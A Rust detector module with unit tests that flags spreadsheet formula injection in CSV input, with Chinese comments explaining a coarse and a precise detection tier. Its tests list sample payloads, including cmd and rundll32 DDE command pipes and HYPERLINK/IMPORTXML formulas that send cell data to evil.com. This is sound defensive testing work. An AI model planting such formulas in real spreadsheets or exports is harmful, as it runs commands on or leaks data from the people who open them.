// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

use crate::{regex_detect, AttackCategory, DetectionResult, Detector, Severity};
use regex::Regex;
use std::sync::LazyLock;

// 与 CsvInjectionDetector 的分工：那边是粗粒度层（任意行首 =+-@ 都报，
// Medium），这边是精确层（只报能执行命令或外带数据的载荷，High）。
// 因此 `=SUM(A1:A5)` 这类纯算术公式不算本检测器的目标——它够不到 shell
// 也够不到网络，且已被粗粒度层兜住；重复报一遍只是噪音。
static PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        // =cmd|' /C calc'!A0：命令管道。锚点带上单元格边界——CSV 一行多个字段，
        // 载荷常出现在 `admin,=cmd|...` 这种第 2 个字段里
        Regex::new(r"(?im)(?:^|[,;])[ \t]*[=+\-@][ \t]*cmd[ \t]*\|").unwrap(),
        // 能外带数据或触发本地程序的内置函数
        Regex::new(r"(?im)(?:^|[,;])[ \t]*[=+\-@][ \t]*(?:HYPERLINK|IMPORTXML|IMPORTDATA|IMPORTRANGE|IMPORTFEED|WEBSERVICE|FILTERXML|RTD|EXEC)[ \t]*\(").unwrap(),
        // 任意二进制 + DDE 单元格引用：=rundll32|...!A0、=2+5+cmd|...!A0
        Regex::new(r"(?im)(?:^|[,;])[ \t]*[=+\-@][^\n|]{0,120}\|[^\n]{0,120}![A-Z]{1,3}\$?\d{1,5}").unwrap(),
        // DDE( 载荷
        Regex::new(r"(?i)\bDDE[ \t]*\(").unwrap(),
        // legacy @ 前缀公式：@SUM( 等。故意不加 (?i)——小写 @media( 之类是 CSS
        Regex::new(r"(?m)(?:^|[,;])[ \t]*@[ \t]*[A-Z][A-Z0-9.]{1,15}[ \t]*\(").unwrap(),
    ]
});

pub struct FormulaInjectionDetector;

impl Detector for FormulaInjectionDetector {
    fn name(&self) -> &'static str {
        "formula_injection"
    }

    fn detect(&self, input: &str) -> Option<DetectionResult> {
        regex_detect(&PATTERNS, self.name(), AttackCategory::Data, Severity::High, "Spreadsheet formula injection detected", input)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_helpers::{assert_clean, assert_detected};

    fn det() -> FormulaInjectionDetector {
        FormulaInjectionDetector
    }

    fn assert_hit(input: &str) {
        assert_detected(&det(), input, AttackCategory::Data, Severity::High);
    }

    #[test]
    fn name_is_formula_injection() {
        assert_eq!(det().name(), "formula_injection");
    }

    #[test]
    fn detects_command_pipe_and_dde_cell_ref() {
        for input in [
            "=cmd|' /C calc'!A0",
            "=cmd|'/C powershell'!A1",
            "+cmd|' /C calc'!A0",
            "@cmd|' /C calc'!A0",
            "=rundll32|'javascript:alert(1)'!A0",
            "=2+5+cmd|' /C calc'!A0",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn detects_data_exfiltration_functions() {
        for input in [
            r#"=HYPERLINK("http://evil.com?x="&A1,"click")"#,
            r#"=IMPORTXML("http://evil.com","//x")"#,
            r#"=IMPORTDATA("http://evil.com/x.csv")"#,
            r#"=IMPORTRANGE("http://evil.com","Sheet1!A1")"#,
            r#"=WEBSERVICE("http://evil.com")"#,
            r#"=FILTERXML("http://evil.com","//x")"#,
            r#"=RTD("foo.bar",,"x")"#,
            r#"=EXEC("calc")"#,
            r#"=  HYPERLINK("http://evil.com")"#,
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn detects_legacy_at_formulas_and_dde() {
        for input in [
            "@SUM(1+1)*cmd|' /C calc'!A0",
            "@SUM(1+1)",
            "@HYPERLINK(\"http://evil.com\")",
            r#"DDE("cmd";"/C calc";"!A0")"#,
            "=DDE(\"cmd\",\"/C calc\")",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn detects_payload_in_multiline_csv() {
        let csv = "name,email\nadmin,=cmd|' /C calc'!A0\nbob,bob@x.com";
        let r = det().detect(csv).expect("expected detection");
        assert_eq!(r.attack_type, "formula_injection");
        assert!(
            r.matched_pattern.contains("=cmd|"),
            "matched_pattern 应覆盖载荷: {:?}",
            r.matched_pattern
        );
        assert_eq!(&csv[r.offset..r.offset + r.matched_pattern.len()], r.matched_pattern);
    }

    #[test]
    fn ignores_benign_inputs() {
        for input in [
            "Hello, this is a normal text input. Nothing suspicious here.",
            "= 5",
            "-3 度",
            "+1 more item",
            "@alice 你好",
            "a@b.com",
            "contact: alice@example.com",
            "cost is -20 dollars",
            "=SUM(A1:A5) 是求和公式",
            "=AVERAGE(B1:B9)",
            "@media (max-width: 600px)",
            "user[name]=alice",
            "价格从 -5 到 +5 不等",
        ] {
            assert_clean(&det(), input);
        }
    }

    #[test]
    fn plain_sum_is_left_to_the_coarse_tier() {
        // 精确层放行、粗粒度层兜底——两层分工，不重复告警
        use crate::data::CsvInjectionDetector;
        for input in ["=SUM(A1:A5)", "=SUM(A1:A5) 是求和公式", "=1+1"] {
            assert_clean(&det(), input);
            assert!(
                CsvInjectionDetector.detect(input).is_some(),
                "csv_injection 粗粒度层应仍命中: {input}"
            );
        }
    }

    #[test]
    fn edge_cases() {
        assert_clean(&det(), "");
        assert_clean(&det(), "   ");
        assert_clean(&det(), "你好世界 こんにちは");
        // 前缀出现在单元格中间（前面不是行首也不在字段边界）
        assert_clean(&det(), "a=cmd|' /C calc'!A0");
        // 单元格边界识别：CSV 第二个字段
        assert_hit("admin,=cmd|' /C calc'!A0");
        assert_hit("x;=HYPERLINK(\"http://evil.com\")");
        // 缺 `!A0` 单元格引用的普通管道
        assert_clean(&det(), "=foo|bar");
        // DDE 前面的单词边界
        assert_clean(&det(), "baddle(");
    }
}
